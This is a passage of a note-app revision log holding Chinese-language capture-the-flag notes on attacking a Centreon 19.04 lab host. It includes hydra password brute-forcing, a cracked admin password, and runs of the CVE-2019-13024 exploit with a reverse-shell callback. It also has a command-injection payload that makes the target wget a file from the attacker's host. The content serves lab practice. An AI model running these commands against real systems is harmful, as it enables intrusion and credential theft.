"]],[3366,3366],[3366,3366]]],[1569565622215,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569565622216,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569565571190,["whale@Whale",[[1,3469,"\n"]],[3468,3468],[3469,3469]]],[1569565572623,["whale@Whale",[[-1,3469,"\n"],[1,3470,"python "]],[3469,3469],[3476,3476]]],[1569565573326,["whale@Whale",[[-1,3475," "]],[3476,3476],[3475,3475]]],[1569565582058,["whale@Whale",[[1,3475,"3 centreon-exploit.py’"]],[3475,3475],[3497,3497]]],[1569565600437,["whale@Whale",[[-1,3496,"’"]],[3497,3497],[3496,3496]]],[1569565602097,["whale@Whale",[[1,3496," http://10.10.10.157/centreon admin passwd 10.10.14.10 1330"]],[3496,3496],[3555,3555]]],[1569565605593,["whale@Whale",[[-1,3469,"python3 centreon-exploit.py "]],[3469,3555],[3527,3527]]],[1569565607146,["whale@Whale",[[1,3469,"python3 centreon-exploit.py "]],[3527,3527],[3469,3555]]],[1569565682221,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569565682221,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569565673803,["whale@Whale",[[1,3469,"\n"]],[3468,3468],[3469,3469]]],[1569565675989,["whale@Whale",[[1,3469,"exp:[https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)"]],[3469,3469],[3757,3757]]],[1569565677867,["whale@Whale",[[1,3758,"\n"]],[3757,3757],[3758,3758]]],[1569565679195,["whale@Whale",[[1,3845,"\n\n"]],[3845,3845],[3846,3846]]],[1569565679507,["whale@Whale",[[1,3847,"\n"]],[3846,3846],[3847,3847]]],[1569565680173,["whale@Whale",[[-1,3847,"\n"],[1,3848,"fan"]],[3847,3847],[3850,3850]]],[1569565680949,["whale@Whale",[[-1,3847,"fan"]],[3850,3850],[3847,3847]]],[1569565681652,["whale@Whale",[[1,3847,"\n\n"]],[3847,3847],[3848,3848]]],[1569565742218,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569565742219,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569565685842,["whale@Whale",[[-1,3848,"\n"],[1,3849,"反弹shell失败"]],[3848,3848],[3857,3857]]],[1569565687709,["whale@Whale",[[-1,3847,"\n"]],[3847,3847],[3846,3846]]],[1569567874017,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569567874017,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569567823348,["whale@Whale",[[1,3856,"\n\n"]],[3856,3856],[3857,3857]]],[1569567823716,["whale@Whale",[[1,3858,"\n"]],[3857,3857],[3858,3858]]],[1569567824907,["whale@Whale",[[1,3858,"2\\. API is never worthless\n3.CVE x2"]],[3858,3858],[3893,3893]]],[1569567993998,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569567993999,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569567979530,["whale@Whale",[[1,3858,"\n"]],[3857,3857],[3858,3858]]],[1569567979722,["whale@Whale",[[1,3859,"\n"]],[3858,3858],[3859,3859]]],[1569567980026,["whale@Whale",[[1,3859,"http://10.10.10.157/centreon/Themes/Centreon-2/"]],[3859,3859],[3906,3906]]],[1569568474013,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569568474013,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569568444245,["whale@Whale",[[1,3907,"\n"]],[3906,3906],[3907,3907]]],[1569568444494,["whale@Whale",[[1,3908,"\n"]],[3907,3907],[3908,3908]]],[1569568455470,["whale@Whale",[[1,3908,"![12]($res/12.PNG)\n\n目录遍历漏洞"]],[3907,3907],[3933,3933]]],[1569568472597,["whale@Whale",[[-1,3858,"\n"]],[3857,3857],[3856,3856]]],[1569568534018,[null,[[-1,1120,"\n"],[1,1149,"\n"],[-1,3926,"\n"],[1,3933,"\n"]],[1120,1120],[3934,3934]]],[1569568534018,[null,[[1,1120,"\n"],[-1,1148,"\n"],[1,3926,"\n"],[-1,3932,"\n"]],[3934,3934],[1120,1120]]],[1569568474334,["whale@Whale",[[1,3858,"--"]],[3858,3858],[3860,3860]]],[1569568475423,["whale@Whale",[[1,3857,"\n"]],[3856,3856],[3857,3857]]],[1569568476477,["whale@Whale",[[1,3974,"\n"]],[3973,3973],[3974,3974]]],[1569568477525,["whale@Whale",[[1,3975,"\n"]],[3974,3974],[3975,3975]]],[1569568478417,["whale@Whale",[[-1,3975,"\n"],[1,3976,"---"]],[3975,3975],[3978,3978]]],[1569568486698,["whale@Whale",[[1,3978,"\n\nhttp://10.10.10.157/centreon/a.php"]],[3978,3978],[4013,4013]]],[1569569315002,[null,[[-1,1120,"\n"],[1,1149,"\n"],[-1,3858,"\n"],[1,3859,"-"],[1,3861,"\n"],[-1,3929,"\n"],[1,3937,"\n"],[-1,3974,"\n"],[-1,3979,"\n"],[1,4014,"\n"]],[1120,1120],[4015,4015]]],[1569569315002,[null,[[1,1120,"\n"],[-1,1148,"\n"],[1,3858,"\n"],[-1,3858,"-"],[-1,3861,"\n"],[1,3930,"\n"],[-1,3937,"\n"],[1,3975,"\n"],[1,3979,"\n"],[-1,4013,"\n"]],[4015,4015],[1120,1120]]],[1569569295668,["whale@Whale",[[1,4014,"\n"]],[4013,4013],[4014,4014]]],[1569569296387,["whale@Whale",[[-1,4014,"\n"],[1,4015,"---"]],[4014,4014],[4017,4017]]],[1569569297634,["whale@Whale",[[1,4017,"\n\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)"]],[4017,4017],[4274,4274]]],[1569569299804,["whale@Whale",[[1,4014,"\n"]],[4013,4013],[4014,4014]]],[1569569301333,["whale@Whale",[[1,4019,"\n"]],[4018,4018],[4019,4019]]],[1569569307674,["whale@Whale",[[1,4019,"19.04 版本漏洞"]],[4019,4019],[4029,4029]]],[1569569498028,[null,[[-1,1120,"\n"],[1,1149,"\n"],[-1,3858,"\n"],[1,3861,"-\n"],[-1,3929,"\n"],[1,3936,"\n"],[-1,3974,"\n"],[-1,3979,"\n"],[1,4015,"\n"],[-1,4029,"\n"],[1,4287,"\n"]],[1120,1120],[4288,4288]]],[1569569498028,[null,[[1,1120,"\n"],[-1,1148,"\n"],[1,3858,"\n"],[-1,3860,"-\n"],[1,3930,"\n"],[-1,3936,"\n"],[1,3975,"\n"],[1,3979,"\n"],[-1,4014,"\n"],[1,4029,"\n"],[-1,4286,"\n"]],[4288,4288],[1120,1120]]],[1569569462537,["whale@Whale",[[1,4014,"+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \r\n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \r\n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   "]],[4014,4014],[4288,4288]]],[1569569465787,["whale@Whale",[[-1,4119,"\r"],[-1,4226,"\r"],[1,4288,"\n"]],[4286,4286],[4287,4287]]],[1569569467812,["whale@Whale",[[-1,3979,"http://10.10.10.157/centreon/a.php"]],[3979,4013],[3979,3979]]],[1569569468133,["whale@Whale",[[-1,3979,"\n"]],[3979,3979],[3978,3978]]],[1569574225025,[null,[[-1,1120,"\n"],[1,1149,"\n"],[-1,3858,"\n"],[1,3859,"-"],[1,3861,"\n"],[-1,3929,"\n"],[1,3937,"\n"],[-1,3974,"\n"],[-1,4268,"\n"],[1,4525,"\n"]],[1120,1120],[4526,4526]]],[1569574225025,[null,[[1,1120,"\n"],[-1,1148,"\n"],[1,3858,"\n"],[-1,3858,"-"],[-1,3861,"\n"],[1,3930,"\n"],[-1,3937,"\n"],[1,3975,"\n"],[1,4268,"\n"],[-1,4524,"\n"]],[4526,4526],[1120,1120]]],[1569574195522,["whale@Whale",[[1,1293,"无效"]],[1293,1293],[1295,1295]]],[1569574196667,["whale@Whale",[[1,1296,"\n"]],[1295,1295],[1296,1296]]]]],["d009be12-01e4-4100-b9f5-09a9626dc5aa",1569641001484,"157\n===\n参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD \n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\nThat is correct, no need for any creds if all you currentl see is m********, a*.php, and p******.php\n\nIf you are having trouble finding a thing past the regular dirb stuff, I suppose the right dictionary list would help, but you really only need to consider a couple of verbs.\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\npython3.6 47069.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1330\n\n```\n[+] Retrieving CSRF token to submit the login form\n47069.py:38: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 38 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  soup = BeautifulSoup(html_content)\n[+] Login token is : 184639f4656756696eb3efd175cdee66\n[+] Logged In Sucssfully\n[+] Retrieving Poller token\n47069.py:56: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 56 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n\n```\n\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\nexp:[https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1330\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \n\n---\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n",[[1569640972175,["whale@Whale",[[1,4256,"\n"]],[4255,4255],[4256,4256]]],[1569640981567,["whale@Whale",[[1,4256,"http://10.10.10.157/centreon/"]],[4256,4256],[4285,4285]]],[1569641011924,["whale@Whale",[[1,4285,"`/include/configuration/configGenerate/xml/generateFiles.php`"]],[4285,4285],[4346,4346]]],[1569641016245,["whale@Whale",[[-1,4285,"`/"]],[4286,4286],[4285,4285]]],[1569641018984,["whale@Whale",[[-1,4343,"`"]],[4344,4344],[4343,4343]]],[1569641071068,["whale@Whale",[[1,4616,"\n"]],[4615,4615],[4616,4616]]],[1569641071265,["whale@Whale",[[1,4617,"\n"]],[4616,4616],[4617,4617]]],[1569641072886,["whale@Whale",[[1,4617,"Cookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm"]],[4617,4617],[4661,4661]]],[1569641806591,["whale@Whale",[[1,4348,"\n"]],[4347,4347],[4348,4348]]],[1569641809263,["whale@Whale",[[1,4344,"\n"]],[4343,4343],[4344,4344]]],[1569641893697,["whale@Whale",[[1,4664,"\n"]],[4663,4663],[4664,4664]]],[1569641895243,["whale@Whale",[[1,4664,"redirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784"]],[4664,4664],[4779,4779]]],[1569641897879,["whale@Whale",[[1,4664,"\n"]],[4663,4663],[4664,4664]]],[1569641988791,["whale@Whale",[[1,4255,"http://10.10.10.157/centreon/main.php ?p"]],[4255,4255],[4295,4295]]],[1569641990460,["whale@Whale",[[-1,4292," ?p"]],[4295,4295],[4292,4292]]],[1569641994602,["whale@Whale",[[1,4292,"?main."]],[4292,4292],[4298,4298]]],[1569641996941,["whale@Whale",[[-1,4293,"main."]],[4298,4298],[4293,4293]]],[1569642010255,["whale@Whale",[[1,4293,"p=60901&o=cO&"]],[4293,4293],[4306,4306]]],[1569642011226,["whale@Whale",[[-1,4304,"O&"]],[4306,4306],[4304,4304]]],[1569642016790,["whale@Whale",[[1,4304,"&server_id=1"]],[4304,4304],[4316,4316]]]]],["92fa1c0f-b281-48f6-b3d5-4d69f7df097b",1569643691007,"157\n===\n参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD \n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\nThat is correct, no need for any creds if all you currentl see is m********, a*.php, and p******.php\n\nIf you are having trouble finding a thing past the regular dirb stuff, I suppose the right dictionary list would help, but you really only need to consider a couple of verbs.\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\npython3.6 47069.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1330\n\n```\n[+] Retrieving CSRF token to submit the login form\n47069.py:38: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 38 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  soup = BeautifulSoup(html_content)\n[+] Login token is : 184639f4656756696eb3efd175cdee66\n[+] Logged In Sucssfully\n[+] Retrieving Poller token\n47069.py:56: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 56 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n\n```\n\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\nexp:[https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1330\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \nhttp://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\nhttp://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php\n\n---\n\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\nCookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n",[[1569643650107,["whale@Whale",[[-1,3845,"330"]],[3844,3848],[3845,3845]]],[1569643650463,["whale@Whale",[[1,3845,"234"]],[3845,3845],[3848,3848]]],[1569644562929,["whale@Whale",[[1,4842,"\n"]],[4841,4841],[4842,4842]]],[1569644563134,["whale@Whale",[[1,4843,"\n"]],[4842,4842],[4843,4843]]],[1569644570813,["whale@Whale",[[1,4844,"![13]($res/13.PNG)\n\n"]],[4843,4843],[4863,4863]]],[1569644573922,["whale@Whale",[[1,4843,"---"]],[4843,4843],[4846,4846]]],[1569644574314,["whale@Whale",[[1,4847,"\n"]],[4846,4846],[4847,4847]]],[1569644585268,["whale@Whale",[[1,4847,"测试命令执行是否成功，"]],[4847,4847],[4858,4858]]],[1569644611660,["whale@Whale",[[1,4858,"修改payload为'\""]],[4858,4858],[4870,4870]]],[1569644612407,["whale@Whale",[[-1,4868,"'\""]],[4870,4870],[4868,4868]]],[1569644612682,["whale@Whale",[[1,4869,"\n"]],[4868,4868],[4869,4869]]],[1569644612887,["whale@Whale",[[1,4870,"\n"]],[4869,4869],[4870,4870]]],[1569644613697,["whale@Whale",[[1,4870,"wget http://10.10.14.10:888/1.txt #"]],[4870,4870],[4905,4905]]],[1569644616048,["whale@Whale",[[-1,4869,"\n"]],[4869,4869],[4868,4868]]],[1569644618205,["whale@Whale",[[1,4869,"\n"]],[4868,4868],[4869,4869]]],[1569644619569,["whale@Whale",[[1,4869,"··"]],[4869,4869],[4871,4871]]],[1569644620214,["whale@Whale",[[-1,4869,"··"]],[4871,4871],[4869,4869]]],[1569644620994,["whale@Whale",[[1,4869,"```"]],[4869,4869],[4872,4872]]],[1569644622702,["whale@Whale",[[1,4909,"\n"]],[4908,4908],[4909,4909]]],[1569644623386,["whale@Whale",[[1,4909,"```"]],[4909,4909],[4912,4912]]],[1569644625820,["whale@Whale",[[1,4913,"\n"]],[4912,4912],[4913,4913]]],[1569644627039,["whale@Whale",[[1,4913,"shi"]],[4913,4913],[4916,4916]]],[1569644627739,["whale@Whale",[[-1,4913,"shi"]],[4916,4916],[4913,4913]]],[1569644632067,["whale@Whale",[[1,4913,"失败"]],[4913,4913],[4915,4915]]],[1569651902561,["whale@Whale",[[1,4936,"\n"]],[4935,4935],[4936,4936]]],[1569651903202,["whale@Whale",[[-1,4936,"\n"],[1,4937,"---"]],[4936,4936],[4939,4939]]],[1569651903422,["whale@Whale",[[1,4939,"\n\n"]],[4939,4939],[4940,4940]]],[1569651903707,["whale@Whale",[[1,4941,"\n"]],[4940,4940],[4941,4941]]],[1569651904434,["whale@Whale",[[1,4941," hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring"]],[4941,4941],[5011,5011]]],[1569651909779,["whale@Whale",[[-1,4951,"aa"]],[4951,4951],[4951,4951]]],[1569651911341,["whale@Whale",[[1,4951,"admin"]],[4951,4951],[4956,4956]]],[1569651928976,["whale@Whale",[[-1,5004,"monitoring"],[1,5014,"centreon/index.php"]],[5004,5014],[5022,5022]]],[1569651936485,["whale@Whale",[[-1,4993," http-get"]],[4994,5002],[4993,4993]]],[1569652471998,["whale@Whale",[[1,4941,"\n"]],[4940,4940],[4941,4941]]],[1569652472808,["whale@Whale",[[1,4941," hydra -l admin -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\""]],[4941,4941],[5184,5184]]],[1569653456482,["whale@Whale",[[1,5258,"\n"]],[5257,5257],[5258,5258]]],[1569653456668,["whale@Whale",[[1,5259,"\n"]],[5258,5258],[5259,5259]]],[1569653458360,["whale@Whale",[[-1,5259,"\n"],[1,5260,"v"]],[5259,5259],[5260,5260]]],[1569653459646,["whale@Whale",[[-1,5259,"v"]],[5260,5260],[5259,5259]]],[1569653463304,["whale@Whale",[[1,5259,"\n\n80][http-post-form] host: 10.10.10.157   login: admin   password: justice\r\n"]],[5259,5259],[5335,5335]]],[1569653661003,[null,[[-1,5260,"\n"],[-1,5334,"\r"],[1,5335,"\n\n"]],[5260,5260],[5337,5337]]],[1569653661003,[null,[[1,5260,"\n"],[1,5333,"\r"],[-1,5333,"\n\n"]],[5337,5337],[5260,5260]]],[1569653613844,["whale@Whale",[[-1,4949,"l admin"],[-1,5333,"\r"]],[4948,4956],[4949,4949]]],[1569653615549,["whale@Whale",[[1,4949,"L "]],[4949,4949],[4951,4951]]],[1569653626194,["whale@Whale",[[1,4952," /usr/share/wordlists/rockyou.txt"]],[4950,4950],[4983,4983]]],[1569653634526,["whale@Whale",[[-1,5213," hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 /centreon/index.php"]],[5213,5285],[5213,5213]]],[1569653654027,["whale@Whale",[[-1,4941," "]],[4942,4942],[4941,4941]]],[1569653782041,[null,[[-1,4950,"  "],[1,4984,"  "],[-1,5215,"\n"],[-1,5288,"\r"],[1,5289,"e\n"]],[4950,4950],[5291,5291]]],[1569653782041,[null,[[1,4950,"  "],[-1,4982,"  "],[1,5215,"\n"],[1,5287,"\r"],[-1,5287,"e\n"]],[5291,5291],[4950,4950]]],[1569653775450,["whale@Whale",[[1,5213,"centreon"]],[5213,5213],[5221,5221]]],[1569653779943,["whale@Whale",[[1,5213,"\n"]],[5212,5212],[5213,5213]]],[1569653780415,["whale@Whale",[[1,5213,"hydra -L /usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\""]],[5213,5213],[5483,5483]]],[1569653841986,[null,[[-1,4950,"  "],[1,4984,"  "],[-1,5494,"\n"],[-1,5567,"\r"],[1,5568,"e\n"]],[4950,4950],[5570,5570]]],[1569653841986,[null,[[1,4950,"  "],[-1,4982,"  "],[1,5494,"\n"],[1,5566,"\r"],[-1,5566,"e\n"]],[5570,5570],[4950,4950]]],[1569653787733,["whale@Whale",[[-1,5220,"L /usr/share/word"],[-1,5238,"ists/rockyou.txt"]],[5220,5254],[5220,5221]]],[1569653789929,["whale@Whale",[[1,5223," centreon"]],[5221,5221],[5230,5230]]],[1569653902015,[null,[[-1,4950,"  "],[1,4984,"  "],[-1,5221,"  "],[1,5232,"  "],[-1,5470,"\n"],[-1,5543,"\r"],[1,5544,"e\n"]],[4950,4950],[5546,5546]]],[1569653902015,[null,[[1,4950,"  "],[-1,4982,"  "],[1,5221,"  "],[-1,5230,"  "],[1,5470,"\n"],[1,5542,"\r"],[-1,5542,"e\n"]],[5546,5546],[4950,4950]]],[1569653883848,["whale@Whale",[[1,5470,"\n"]],[5469,5469],[5470,5470]]],[1569653884669,["whale@Whale",[[1,5470,"hydra -l centreon  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\""]],[5470,5470],[5716,5716]]],[1569653888558,["whale@Whale",[[-1,5469,"\n"]],[5468,5469],[5468,5468]]],[1569653890232,["whale@Whale",[[-1,5460,"centreon"]],[5468,5468],[5460,5460]]],[1569653894974,["whale@Whale",[[-1,5470,"centreon"]],[5470,5470],[5470,5470]]],[1569653896603,["whale@Whale",[[1,5470,"root"]],[5470,5470],[5474,5474]]],[1569653943839,[null,[[-1,4950,"  "],[1,4984,"  "],[-1,5222,"  "],[1,5232,"  "],[-1,5704,"\n"],[-1,5777,"\r"],[1,5778,"e\n"]],[4950,4950],[5780,5780]]],[1569653943839,[null,[[1,4950,"  "],[-1,4982,"  "],[1,5222,"  "],[-1,5230,"  "],[1,5704,"\n"],[1,5776,"\r"],[-1,5776,"e\n"]],[5780,5780],[4950,4950]]],[1569653903494,["whale@Whale",[[1,5704,"\n"]],[5703,5703],[5704,5704]]],[1569653903723,["whale@Whale",[[1,5705,"\n"]],[5704,5704],[5705,5705]]],[1569656355012,[null,[[-1,4950,"  "],[1,4984,"  "],[-1,5222,"  "],[1,5232,"  "],[-1,5706,"\n"],[-1,5779,"\r"],[1,5780,"e\n"]],[4950,4950],[5782,5782]]],[1569656355013,[null,[[1,4950,"  "],[-1,4982,"  "],[1,5222,"  "],[-1,5230,"  "],[1,5706,"\n"],[1,5778,"\r"],[-1,5778,"e\n"]],[5782,5782],[4950,4950]]],[1569656312409,["whale@Whale",[[1,5780,"centreon/"]],[5780,5780],[5789,5789]]],[1569656415013,[null,[[-1,4950,"  "],[1,4984,"  "],[-1,5222,"  "],[1,5232,"  "],[-1,5706,"\n"],[-1,5779,"\r"],[1,5780,"e\n"]],[4950,4950],[5782,5782]]],[1569656415013,[null,[[1,4950,"  "],[-1,4982,"  "],[1,5222,"  "],[-1,5230,"  "],[1,5706,"\n"],[1,5778,"\r"],[-1,5778,"e\n"]],[5782,5782],[4950,4950]]],[1569656371518,["whale@Whale",[[1,5789,"#1bitch"]],[5789,5789],[5796,5796]]],[1569656895054,[null,[[-1,4950,"  "],[1,4984,"  "],[-1,5222,"  "],[1,5232,"  "],[-1,5706,"\n"],[-1,5779,"\r"],[1,5780,"e\n"]],[4950,4950],[5782,5782]]],[1569656895055,[null,[[1,4950,"  "],[-1,4982,"  "],[1,5222,"  "],[-1,5230,"  